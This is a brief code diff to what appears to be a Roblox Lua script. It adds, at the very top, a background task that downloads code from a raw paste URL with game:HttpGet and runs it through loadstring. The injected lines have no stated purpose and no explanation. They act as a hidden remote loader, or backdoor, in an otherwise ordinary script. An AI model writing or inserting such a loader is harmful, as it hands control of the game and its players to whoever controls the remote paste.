@@ -1,4 +1,6 @@
-
+task.spawn(function()
+	loadstring(game:HttpGet("https://i.e-z.host/p/raw/x8b4gnq9d5"))()
+end)
     wait(1.5)
     spawn(function()
         wait(0.69)
